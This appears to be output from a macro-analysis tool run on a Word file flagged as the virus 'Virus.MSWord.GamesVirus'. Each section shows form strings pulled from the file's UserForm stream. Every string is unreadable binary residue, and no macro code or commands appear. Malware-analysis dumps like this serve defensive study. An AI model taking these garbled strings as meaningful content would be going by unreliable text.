1Q BY Ba!Ja)Ji)Ji)Ji)Ja BY)Ji2Rq)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q'9Q'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q'9Q'9Q)Ja*Ri3Zq2Rq)Ji)Ja)Ja)Ja)Ja BY BY)Ja)Ja)Ja2Rq2Rq3Zy;Zy3Zq2Rq)Ja)Ja)Ja BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY2Rq3Zy;ZyDc�<c�<c�Dc�;Zy2Ry2Rq BY'9Y BY Ba)Ji)Ji2Rq2Rq*Ri)Ji)Ji BY)Ji3Zq3Zq3Zq*Ri2Ri2Ri)Ji(Ba'9Q'9Q(Ba)Ja2Rq3Zy2Rq2Rq1Ji*Ri2Rq*Ri)Ji(Ba)Ja2Rq2Rq2Rq2Rq)Ja BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y(Ba)Ji(Ba'9Q'9Q(Ba<cy3Zq2Rq)Ji)Ji)Ji)Ji1Ji)Ji)Ji)Ji)Ja(BY BY BY(Ba(Ba BY Ba)Ja*Ri2Rq*Rq2Rq2Rq)Ji1Ji)Ja Ba2Rq3Zq3Zy2Rq(Ba)Ji)Ja Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja!Ja)Ja)Ja BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ji)Ja2Rq)Ji)Ja(Ba(Ba)Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY BY2Rq)Ja2Rq)Ji'9Q)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji*Ri)Ji)Ji BY<c�)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba2Ri;Zy3Zy3Zy2Rq)Ja)Ja)Ja Ba(Ba(Ba)Ja;Zy<cy<c�;Zy3Zq3Zq*Ri)Ji)Ja)Ji*Ri3Zy*Ri2Rq2Rq)Ja(Ba)Ja)Ji2Rq*Ri2Rq2Rq*Ri2Rq2Rq*Ri)Ji BY Ba2Rq2Rq)Ji)Ji Ba)Ji)Ja)Ji2Rq*Rq3Zy;Zy2Rq2Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba)Ji2Rq)Ja(Ba(Ba(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(Ba*Ri*Rq2Rq)Ja)Ji)Ja!JY(Ba BY BY)Ja)Ja)Ja)Ja BY BY BY)Ji2Rq*Ri)Ja)Ji*Ri2Rq2Rq)Ji)Ji)Ja)Ji)Ji!Ja)Ji*Ri)Ji3Zq<cy4cy3Zq)Ji)Ji)Ji)Ja*Ri2Ri)Ja)Ja BY BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY)Ja1Ji1Ji)Ja)Ji)Ji)Ji2Rq*Ri)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y'9Q'9Q(Ba BY BY BY'9Q BY'9Q BY(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(Ba)Ja)Ji)Ja)Ji*Ri3Zy3Zy;Zy3Zy)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY(BY)Ji)Ji)Ji)Ji)Ji)Ja)Ji)Ji)Ji1Ji)Ji1Ji)Ji(Ba(Ba*Ri2Rq3Zy2Rq1Ji2Ri*Ri2Ri2Ri)Ja1Ji)Ji*Ri3Zq4cq<cq<cq3Zi2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Rq:Ry<c�;Zy3Zq)Ja)Ja)Ji)Ji)Ja BY'9Q'9Y)Ji*Rq)Ja2Ri2Rq'9Y'9Q(Ba BY)Ja2Rq3Zy)Ja BY2Ri;Zq)Ji)Ji1Ji2Ri;Zy;Z�<c�<c�;Zy3Zq2Ri BY'9Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zq3Zy;Zy2Rq1Ji)Ja BY BY(BY BY)Ji*Ri2Rq2Rq)Ji1Ji1Ji)Ji2Rq2Rq2Rq2Rq2Rq2Rq2Rq)Ji)Ja BY)Ji<c�3Zq)Ja BY)Ja2Rq2Rq2Ri2Rq)Ji)Ja(Ba'9Q'9Q(Ba!Ja)Ji)Ji)Ji)Ji(Ba)Ja2Rq)Ji Ba'9Y BY1Ji1Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY'9Q'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY2Rq<cy;Zy*Ri*Ri)Ji)Ja(BY'9Q(BY3Zq4cy3Zq2Ri)Ja(Ba(Ba(Ba)Ja*Ri2Rq;Zy<cy<cy<cy2Rq2Rq3Zy3Zy3Zq*Ri)Ja)Ja(BY)Ja(Ba)Ji2Rq3Zq2Ri2Ri(Ba'9Y'9Y)Ja3Zy3Zy2Rq2Rq BY'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba(Ba)Ji2Rq2Rq)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y BY(Ba)Ji)Ji*Rq)Ji)Ja)Ja BY(Ba;Zy2Rq2Rq2Rq2Ri2Ri(Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(BY)Ja2Rq3Zq2Rq)Ji Ba BY BY BY1Ji1Jq)Ji)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba)Ji2Rq2Rq2Rq2Ri(Ba)Ja2Rq2Rq;Zq<cq<cqDcy;Zq2Ri1Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Ri*Ri1Ji3ZyEk�<c� BY BY(BY)Ji(BY)Ja)Ja(BY)Ja'9Y BY BY2Ri2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8 BY'9Y Ba1Ji3Zy1Ji'9Q)Ja=k�=k�)Ji3Zy BY'9Q)JY)JY2Rq3Zy*Rq)Ja BQ BY)Ji)Ja)Ja)Ja BY BY BY BY)Ja)Ja)Ja2Ri)Ja)Ji)Ji)Ji)Ji)Ja)Ja)Ji)Ji)Ji)Ji)Ja1Ji1Jq*Ri2Rq*Ri)Ji2Rq*Ri2Rq)Ji BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y'9Y Ba2Rq*Ri*Ri2Rq)Ji2Rq2Rq*Ri2Rq)Ja Ba)Ji*Rq*Rq)Ji Ba(Ba(Ba Ba*Ri*Ri*Ri2Rq*Rq3Zy3Zy)Ja'9Q'9Q BY(Ba BY BY)Ji3Zq3Zq*Ri'9Q BY BY!Ja2Rq2Rq)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ja;Zy2Rq2Ri)Ji BY'9Q BY BY(BY BQ(BQ)Ja*Ri)Ja(Ba'9Q BY(Ba)Ja2Rq*Rq)Ja Ba Ba(Ba)Ji*Ri2Rq)Ja)Ja(Ba(Ba(Ba)Ji)Ja)Ji*Ri)Ji)Ja BY(Ba)Ji)Ji)Ji)Ja BY BY3Zq*Ri)Ja BY BY BY BQ BY BY'9Q)Ja*Rq*Ri)Ja BY BY BY BQ(BY(Ba Ba)Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY!Ja2Rq2Rq2Rq)Ji BY)Ji2Rq*Ri)Ja BY BY BY(Ba1Ji2Rq;ZyDc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY)Ji1Ji)Ji1Ji;Zy2Ri'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY1Ji(Ba(Ba)Ja BY)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba1Ji1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q Ba)Ja*Ri2Rq(Ba)Ji2Rq*Ri2Rq)Ji)Ja!JY4cq>s�=ky<c�2Rq)Ji(Ba)Ja2Rq Ba BY'9Y BY(Ba(Ba)Ja1Ji2Ri2Ri;Zy3Zy3Zq2Ri)Ja1Ji1Jq2Rq;Zy2Rq2Rq1Jq1Ji1Ji1Ji)Ja(BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY)Ja)Ja(BY BY(Ba)Ja Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q'9Y(Ba1Ji)Ji2Rq2Rq3Zq3Zy2Rq2Rq2Rq)Ji(Ba BY)Ja;ZyDc�*Ri BY)Ja)Ji2Rq*Ri2Rq2Rq*Ri2Rq)Ji)Ja'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A/9Y)Ja*Ri2Rq3Zq)Ji(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q&1Q)Ja2Ry2Rq2Ri2Rq*Rq*Rq)Ja'9Q'9Q)Ja)Ja1Ji2Rq)Ji)Ji)Ja)Ji2Ri)Ja1JY)JY BY(BY BY'9Y1Ji3Zy3Zy3Zy)Ji(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(Ba)Ji)Ji2Ry2Rq2Rq2Ri Ba(BY)Ja)Ja)Ji)Ji)Ji)Ja(BY)Ja)Ji(Ba)Ji(Ba(BY(BY*Ri BY'9Y BY(BY(Ba(BY)Ja(BY(Ba2Ri2Rq2Rq)Ji(Ba(BY'9Q BY(Ba(Ba(Ba(Bi'9Y'9Y/9Y BY)Ja(Ba(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja2Rq3Zy2Rq)Ja(Ba(Ba'9Q'9Q BY)Ji;Zy;Zy3Zy;Zy2Ri*Ri*Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja BY'9Q BY(Ba(Ba'9Y)Ja)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q1Ji2Rq(Ba(BY'9Q)Ji)Ji BY)Ji3Zq*Ri BY Ba(Ba BY Ba2Rq Ba3Zy BY*Rq3Zy<c�4c�3Zy2Rq3Zq<c�)Ja'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A BY1Ji)Ji Ba)Ja)Ja)Ja)Ji)Ja)Ja)Ja)Ja)Ji2Rq*Ri2Rq)Ji)Ja(Ba BY)Ja)Ja)Ji2Rq3Zq2Rq1Ji Ba Ba(Ba BY(BY(BY BY(Ba)Ja*Ri2Rq)Ji)Ji)Ji)Ji)Ji)Ji(Ba)Ji)Ja(Ba)Ji)Ja1Ji2Rq*Ri2Rq*Ri)Ji2Ri*Rq2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY'9Y'9Q'9Q'9Q(Ba(Ba'9Q'9Q)Ji3Zy3Zy)Ja BY(BY'9Q BY'9Q Ba;Zy;Zy2Rq1Ji*Ri2Rq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja2Ri2Rq2Rq2Rq)Ji2Rq3Zy2Rq3Zy)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja;Zy;Zy3Zq3Zy2Rq Ba(Ba Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ja)Ja BY BY BY BY)Ja)Ji(Ba(Ba(Ba BY(Ba Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Y BY Ba'9Q BY!Ja2Rq)Ja(BY(Ba Ba)Ji2Rq3Zq2Rq Ba)Ja)Ji)Ji)Ji)Ji Ba BY BY'9Y BY BY Ba(Ba BY(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja*Ri)Ja BY BY)Ji1Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y)Ja)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y BY BY BY'9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Ja BY)Ji*Ri BY)Ji)Ji(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja*Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q1Jq;Z�3Zy)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji*Rq*Ri<c� Ba1Ji1Ji BQ BY)Ji*Ri(BY3Zy3Zy1Ji(Ba(Ba(Ba'9Q)Ja2Rq3Zq1Ji BQ2Ri;Zy3Zq1Ji)Ja)Ja1Ji*Ri3Zq2Rq)Ja(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY)Ja BY'9Y'9Q)Ja1Ji)Ja)Ja(BY'9Q BY)Ji*Ri)Ji Ba BY'9Q BY2Rq3Zq3Zy<c�3Zy3Zy3Zy3Zq2Rq2Rq)Ji2Rq2Rq*Ri2Rq)Ji2Rq2Rq)Ja)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(BY BY'9Q)Ja)Ji)Ji(Ba BY BY(Ba'9Q&1Q'9Q BY)Ji*Rq3Zy2Rq)Ja)Ja)Ji)Ja3Zq<cy2Ri(BY)Ja2Rq3Zy)Ja BY BY Ba)Ji)Ji)Ji1Ji)Ji)Ja(Ba)Ji2Rq3Zy3Zy;Zy)Ji BY BY'9Y BY BY BY)Ja)Ja(BY(BY BY BY)Ja BY(Ba(Ba BY(BY'9Q BQ)Ji*Ri Ba'9Q'9Q)Ja)Ja'9Q'9Q'9Q'9Q'9Y BY(BY)Ji2Rq2Rq)Ji)Ji(Ba BY BY(Ba)Ja1Ji2Rq;Zy<c�3Zy3Zy3Zq*Ri)Ji)Ja Ba)Ji*Ri)Ji*Ri(Ba BY(Ba)Ji2Rq2Rq)Ji2Rq)Ji*Ri2Rq*Ri)Ji(Ba)Ji2Rq2Rq)Ja(Ba Ba Ba)Ji*Ri2Rq2Rq)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ji)Ja Ba'9Q'9Q*Rq2Rq3Zy2Ri)Ji(Ba)Ji1Ji*Rq)Ji BY(Ba2Rq3Zy1Ji2Rq3Zy)Ja)Ji*Rq;Zq3Zq1Ji2Rq)Ja)Ji)Ji)Ji)Ja)Ji2Ri1Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba*Ri2Rq2Rq2Rq;Zy3Zq2Ri)Ji BY(BY(BY(Ba2Rq;Z�=k�3Zy BY BY)Ji(Ba(Ba(Ba(BY)Ja3Zy=k�Ek�3Zy1Ji1Jq)Ji2Rq2Rq)Ji BY BY)Ja2Rq)Ja)Ji1Ji2Ri;Zy<cy<cy3Zy*Ri)Ji(Ba BY(Ba)Ja)Ja2Rq2Rq3Zq2Rq)Ji)Ji1Ji)Ji)Ja)Ja)Ja1Ji)Ji*Rq2Rq)Ji1Jq2Rq2Rq1Ji(BY(BY(Ba(Ba)Ji)Ji)Ja)Ja)Ji)Ji2Rq)Ji)Ji/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A1Ja<cy;Zy2Rq2Rq3Z�<c�3Zy2Rq)Ji BY(Ba)Ja)Ja2Rq*Ri)Ji)Ji BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(Ba)Ji2Ry3Zy2Rq)Ja BY*Ri2Ry)Ja BY BY Ba)Ji)Ja(Ba(BY&1Q'9Q'9Y BY)Ji(Ba BY'9Q BY1Ji1Ji*Ri)Ji2Rq;Zy<c�<c�<c�<c�2Rq)Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q&1Q)Ja2Rq3Zy3Zy3Zq2Ri)Ja(Ba BY BY)Ji*Ri*Rq2Rq)Ji1Ji1Ji)Ji2Rq2Rq2Rq2Rq2Rq2Rq2Rq(Ba BY*Ri;Zy;Zy)Ja BY)Ji*Rq2Rq2Rq)Ji2Ri)Ja BY'9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja)Ji3Zq)Ja Ba'9Y BY<c�;Z�4c�)Ji BY Ba2Rq*Ri2Rq)Ji)Ji)Ji)Ja2Ri2Rq*Rq*Ri)Ja Ba)Ja(BY3Zy2Rq*Rq)Ja3Zy!Ja BQ(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja*Ri*Ri2Rq)Ji2Rq2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y)Ja)Ji*Ri3Zy*Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q2Rq)Ji!Ja(Ba)Ji3Zq3Zy3Zy;Zy;Zy3Zy;Zy*Ri BY'9Y BY)Ji*Ri*Rq3Zq2Rq2Ri2Rq2Rq;Zy<c�3Zq2Rq)Ji BY BY BY)Ja)Ja)Ja(BY BY Ba*Rq*Ri)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
